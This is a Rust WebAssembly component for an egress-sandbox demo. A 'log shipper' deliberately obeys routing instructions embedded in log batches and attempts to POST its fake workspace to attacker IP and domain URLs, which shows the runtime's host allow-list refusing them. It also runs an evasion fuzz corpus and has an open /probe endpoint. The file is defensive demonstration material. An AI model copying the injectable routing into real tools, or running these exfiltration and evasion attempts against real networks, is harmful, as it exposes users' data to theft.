//! Egress-exfil sandbox demo: the SHIPPER component (Cosmonic Desktop, p3).
//! Demonstrates MITRE ATT&CK T1041 (Exfiltration Over C2 Channel), contained.
//!
//! A "log shipper", the kind of small agent tool that reads a batch of logs
//! and POSTs it to a collector. It has a real bug (`workspace::route`): it
//! obeys routing instructions found inside the data it ships. Feed it a
//! poisoned batch and it tries to POST its whole workspace to an attacker host.
//!
//! Nothing is patched and nothing in this component checks a destination. The
//! only thing between the shipper and the attacker is the Workload's
//! `allowedHosts`: one hostname, the log sink. Every result on the page is the
//! runtime's own answer to a real `wasi:http/client` request.
//!
//! Routes:
//!   GET /                        -> the UI
//!   GET /run?mode=exfil          -> poisoned batch, attacker IP (default)
//!   GET /run?mode=domain         -> poisoned batch, attacker domain
//!   GET /run?mode=allowed        -> clean batch, shipped to the allow-listed sink
//!   GET /run?mode=fuzz           -> the evasion corpus, summary only
//!   GET /run?mode=all            -> everything above in one report
//!   GET /fuzz                    -> the evasion corpus, every result
//!   GET /probe?authority=<pct>   -> one raw outbound attempt (the CLI harness);
//!                                   &scheme=http|https, default: the sink's
//!   GET /config                  -> this deployment's own host and its sink
//!   GET /corpus.txt              -> the corpus compiled into this build
//!
//! Nothing here names a deployment. The page shows the host the request came
//! in on and the sink host from `LOG_SINK_URL`, and the fuzz builds its
//! "allowed host" variants from that same URL, so one image serves any host.
//!   GET /health                  -> "ok"

mod egress;
mod fuzz;
mod page;
mod workspace;

use egress::Outcome;
use wasip3::http::types::{ErrorCode, Fields, Method, Request, Response};
use wasip3::http_compat::BodyWriter;

/// The branded hero infographic (served at `/hero.png` for the page banner).
const HERO_PNG: &[u8] = include_bytes!("hero.png");

/// Cosmonic's consent-gated analytics loader (the same logic as
/// cosmonic.com/site.js). The page only requests it on a cosmonic.com host.
const SITE_JS: &[u8] = include_bytes!("site.js");

/// The Cosmonic icon mark, served at `/favicon.svg` (official purple #655DC6).
const FAVICON_SVG: &[u8] = br##"<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 38 42"><path fill="#655DC6" d="M17.47,32.38C15.36,26.74,12.59,24,6.92,21.89a.93.93,0,0,1,0-1.75c5.67-2.11,8.44-4.86,10.55-10.5a.93.93,0,0,1,1.76,0c1.7,5.7,3.67,9.57,16.62,9.82a.93.93,0,0,0,.94-.93V12.17a3.35,3.35,0,0,0-1.65-2.88L20.07.46a3.3,3.3,0,0,0-3.35,0L1.65,9.29A3.35,3.35,0,0,0,0,12.18V29.87a3.33,3.33,0,0,0,1.65,2.88l15.07,8.83a3.34,3.34,0,0,0,3.35,0l15.07-8.83a3.33,3.33,0,0,0,1.65-2.88V23.45a.93.93,0,0,0-.95-.93c-13,.25-14.91,4.12-16.61,9.81A.92.92,0,0,1,17.47,32.38Z"/></svg>"##;

const JSON: &str = "application/json; charset=utf-8";
const TEXT: &str = "text/plain; charset=utf-8";

struct Component;

wasip3::http::service::export!(Component);

impl wasip3::exports::http::handler::Guest for Component {
    async fn handle(request: Request) -> Result<Response, ErrorCode> {
        let method = request.get_method();
        let path_q = request.get_path_with_query().unwrap_or_default();
        let self_host = request_host(&request);
        drop(request);
        let (path, query) = match path_q.split_once('?') {
            Some((p, q)) => (p, q),
            None => (path_q.as_str(), ""),
        };
        if !matches!(method, Method::Get) {
            return respond(405, TEXT, b"GET only\n".to_vec());
        }

        match path {
            "/" | "" => {
                let sink = fuzz::Sink::from_url(&sink_url());
                let html = page::render(&self_host, &display_host(&sink.host));
                respond(200, "text/html; charset=utf-8", html.into_bytes())
            }
            "/config" => {
                let url = sink_url();
                let sink = fuzz::Sink::from_url(&url);
                let body = serde_json::json!({
                    "self_host": self_host,
                    "sink_url": url,
                    "sink_scheme": sink.scheme(),
                    "sink_host": sink.host,
                    "sink_authority": sink.authority(),
                });
                respond(200, JSON, body.to_string().into_bytes())
            }
            "/health" => respond(200, TEXT, b"ok\n".to_vec()),
            "/run" => {
                let mode = query_param(query, "mode").unwrap_or_else(|| "exfil".to_string());
                let report = run(&mode).await;
                respond(200, JSON, report.to_string().into_bytes())
            }
            "/fuzz" => {
                let report = fuzz::run(true, &fuzz::Sink::from_url(&sink_url())).await;
                respond(200, JSON, report.to_string().into_bytes())
            }
            "/probe" => {
                let Some(authority) = query_param(query, "authority") else {
                    let body = serde_json::json!({ "error": "missing ?authority= parameter" });
                    return respond(400, JSON, body.to_string().into_bytes());
                };
                let path = query_param(query, "path").unwrap_or_else(|| "/collect".to_string());
                // The scheme follows the configured sink unless the caller says.
                let https = match query_param(query, "scheme").as_deref() {
                    Some("https") => true,
                    Some("http") => false,
                    _ => fuzz::Sink::from_url(&sink_url()).https,
                };
                let attempt =
                    egress::post(https, &authority, &path, b"egress-exfil-sandbox fuzz probe (inert)\n".to_vec())
                        .await;
                respond(200, JSON, attempt.to_json().to_string().into_bytes())
            }
            "/corpus.txt" => respond(200, TEXT, fuzz::CORPUS.as_bytes().to_vec()),
            "/hero.png" => respond(200, "image/png", HERO_PNG.to_vec()),
            "/site.js" => respond(200, "text/javascript; charset=utf-8", SITE_JS.to_vec()),
            "/favicon.svg" => respond(200, "image/svg+xml; charset=utf-8", FAVICON_SVG.to_vec()),
            _ => respond(404, TEXT, b"not found\n".to_vec()),
        }
    }
}

/// The host this request came in on, without its port: the request's
/// authority, or its `Host` header.
fn request_host(request: &Request) -> String {
    let authority = request.get_authority().filter(|a| !a.is_empty()).or_else(|| {
        request
            .get_headers()
            .get("host")
            .into_iter()
            .next()
            .map(|value| String::from_utf8_lossy(&value).into_owned())
    });
    let (host, _port) = fuzz::split_host_port(&authority.unwrap_or_default());
    display_host(&host)
}

/// A host name made safe to put in the page: the request host is whatever the
/// client sent, so keep only characters a host name can have.
fn display_host(host: &str) -> String {
    let clean: String = host
        .chars()
        .filter(|c| c.is_ascii_alphanumeric() || matches!(c, '.' | '-' | '_' | ':' | '[' | ']'))
        .take(253)
        .collect();
    if clean.is_empty() {
        "this host".to_string()
    } else {
        clean
    }
}

/// Where the shipper sends logs by default: `LOG_SINK_URL` from the Workload,
/// or the built-in default.
fn sink_url() -> String {
    std::env::var("LOG_SINK_URL").unwrap_or_else(|_| workspace::DEFAULT_SINK_URL.to_string())
}

/// One scenario: hand the shipper a batch, let it route it, send it, and
/// describe what happened.
async fn ship(scenario: &str, title: &str, batch: &str, sink: &str) -> (serde_json::Value, egress::Attempt) {
    let route = workspace::route(batch, sink);
    let payload = workspace::payload(batch, route.include_workspace);
    let (https, authority, path) = egress::split_url(&route.destination);
    let attempt = egress::post(https, &authority, &path, payload).await;

    let mut row = attempt.to_json();
    if let Some(obj) = row.as_object_mut() {
        obj.insert("scenario".into(), scenario.into());
        obj.insert("title".into(), title.into());
        obj.insert("hijacked".into(), route.injected_by.is_some().into());
        obj.insert("injected_by".into(), route.injected_by.clone().into());
        obj.insert("workspace_attached".into(), route.include_workspace.into());
    }
    (row, attempt)
}

/// Build the report for a `/run` mode. Every count and every quoted error in
/// the verdict comes from the attempts that just ran.
async fn run(mode: &str) -> serde_json::Value {
    let sink = sink_url();
    let want = |m: &str| mode == m || mode == "all";

    let mut rows: Vec<serde_json::Value> = Vec::new();
    let mut exfil_attempts = 0u32;
    let mut exfil_refused = 0u32;
    let mut exfil_delivered = 0u32;
    let mut bytes_to_attacker = 0usize;
    let mut refusals: Vec<String> = Vec::new();
    let mut allowed_attempts = 0u32;
    let mut allowed_delivered = 0u32;
    let mut allowed_note = String::new();

    let attacks: [(&str, &str, &str); 2] = [
        ("exfil", "Exfiltrate to the attacker IP", workspace::ATTACKER_IP_URL),
        ("domain", "Exfiltrate to the attacker domain", workspace::ATTACKER_DOMAIN_URL),
    ];
    for (scenario, title, url) in attacks {
        if !want(scenario) {
            continue;
        }
        let batch = workspace::poisoned_batch(url);
        let (row, attempt) = ship(scenario, title, &batch, &sink).await;
        exfil_attempts += 1;
        match &attempt.outcome {
            Outcome::Connected { .. } => {
                exfil_delivered += 1;
                bytes_to_attacker += attempt.bytes_offered;
            }
            Outcome::Denied { error } | Outcome::Rejected { error, .. } => {
                exfil_refused += 1;
                if !refusals.contains(error) {
                    refusals.push(error.clone());
                }
            }
            // Past the policy check, even though nothing answered: not contained.
            Outcome::Transport { .. } => exfil_delivered += 1,
        }
        rows.push(row);
    }

    if want("allowed") {
        let (row, attempt) =
            ship("allowed", "Send to the allow-listed log sink", workspace::CLEAN_BATCH, &sink).await;
        allowed_attempts += 1;
        match &attempt.outcome {
            Outcome::Connected { status: 200, .. } => {
                allowed_delivered += 1;
                allowed_note = format!("the allow-listed sink {} answered HTTP 200", attempt.authority);
            }
            Outcome::Connected { status, .. } => {
                allowed_note = format!("the allow-listed sink {} answered HTTP {status}", attempt.authority);
            }
            Outcome::Denied { error } | Outcome::Rejected { error, .. } | Outcome::Transport { error } => {
                allowed_note = format!("the send to {} failed: {error}", attempt.authority);
            }
        }
        rows.push(row);
    }

    let fuzz_summary =
        if want("fuzz") { Some(fuzz::run(false, &fuzz::Sink::from_url(&sink)).await) } else { None };
    let fuzz_escaped = fuzz_summary
        .as_ref()
        .and_then(|f| f.get("escaped"))
        .and_then(serde_json::Value::as_u64)
        .unwrap_or(0);

    // The verdict, assembled from what actually happened.
    let contained = exfil_delivered == 0 && fuzz_escaped == 0;
    let mut parts: Vec<String> = Vec::new();
    if exfil_attempts > 0 {
        let how = if refusals.is_empty() { String::new() } else { format!(" ({})", refusals.join(", ")) };
        parts.push(format!(
            "{exfil_attempts} exfiltration attempt{} made, {exfil_refused} refused by the runtime{how}, \
             {bytes_to_attacker} bytes reached the attacker",
            if exfil_attempts == 1 { "" } else { "s" }
        ));
    }
    if allowed_attempts > 0 {
        parts.push(allowed_note.clone());
    }
    if let Some(line) = fuzz_summary.as_ref().and_then(|f| f.get("line")).and_then(serde_json::Value::as_str) {
        parts.push(format!("evasion fuzz: {line}"));
    }
    if parts.is_empty() {
        parts.push(format!("unknown mode \"{mode}\": use exfil, domain, allowed, fuzz or all"));
    }
    let prefix = if !contained {
        "NOT CONTAINED"
    } else if exfil_attempts > 0 || fuzz_summary.is_some() {
        "MITIGATED"
    } else if allowed_attempts > 0 && allowed_delivered == allowed_attempts {
        "DELIVERED"
    } else if allowed_attempts > 0 {
        "NOT DELIVERED"
    } else {
        "ERROR"
    };
    let verdict = format!("{prefix}: {}.", parts.join("; "));

    serde_json::json!({
        "demo": "egress-exfil-sandbox",
        "technique": "T1041 Exfiltration Over C2 Channel",
        "mode": mode,
        "verdict": verdict,
        "contained": contained,
        "configured_sink": sink,
        "workspace": workspace_listing(),
        "exfil_attempts": exfil_attempts,
        "exfil_refused": exfil_refused,
        "exfil_passed_policy": exfil_delivered,
        "bytes_delivered_to_attacker": bytes_to_attacker,
        "allowed_attempts": allowed_attempts,
        "allowed_delivered": allowed_delivered,
        "attempts": rows,
        "fuzz": fuzz_summary,
    })
}

/// Names and sizes of the (fake) workspace files, for the report.
fn workspace_listing() -> Vec<serde_json::Value> {
    workspace::WORKSPACE
        .iter()
        .map(|(name, content)| serde_json::json!({ "path": name, "bytes": content.len() }))
        .collect()
}

/// Extract a percent-decoded query parameter by key. Decodes to raw bytes
/// first so the CLI harness can send any authority, then to a string (the only
/// thing a WIT `string` can carry).
fn query_param(query: &str, key: &str) -> Option<String> {
    for pair in query.split('&') {
        let mut parts = pair.splitn(2, '=');
        if parts.next() == Some(key) {
            return Some(percent_decode(parts.next().unwrap_or("")));
        }
    }
    None
}

fn percent_decode(raw: &str) -> String {
    let mut out: Vec<u8> = Vec::with_capacity(raw.len());
    let mut bytes = raw.bytes();
    while let Some(b) = bytes.next() {
        if b == b'%' {
            let mut rest = bytes.clone();
            let hi = rest.next().and_then(|c| (c as char).to_digit(16));
            let lo = rest.next().and_then(|c| (c as char).to_digit(16));
            if let (Some(hi), Some(lo)) = (hi, lo) {
                out.push(u8::try_from(hi * 16 + lo).unwrap_or(b'?'));
                bytes = rest;
                continue;
            }
        }
        out.push(b);
    }
    String::from_utf8_lossy(&out).into_owned()
}

/// Build a complete p3 response: headers and status, then the one body frame
/// from a spawned component-model task.
fn respond(status: u16, content_type: &str, body: Vec<u8>) -> Result<Response, ErrorCode> {
    let headers = Fields::from_list(&[
        ("content-type".to_string(), content_type.as_bytes().to_vec()),
        ("cache-control".to_string(), b"no-store".to_vec()),
    ])
    .map_err(|err| ErrorCode::InternalError(Some(format!("invalid headers: {err}"))))?;

    let (mut writer, body_rx, result_rx) = BodyWriter::new();
    let (response, _transmit) = Response::new(headers, Some(body_rx), result_rx);
    response
        .set_status_code(status)
        .map_err(|()| ErrorCode::InternalError(Some("invalid status code".into())))?;

    wasip3::wit_bindgen::spawn_local(async move {
        let frame = http_body::Frame::data(bytes::Bytes::from(body));
        let _ = writer.send_frame(frame).await;
        drop(writer.stream_writer);
        let _ = writer.result_writer.write(Ok(None)).await;
    });

    Ok(response)
}
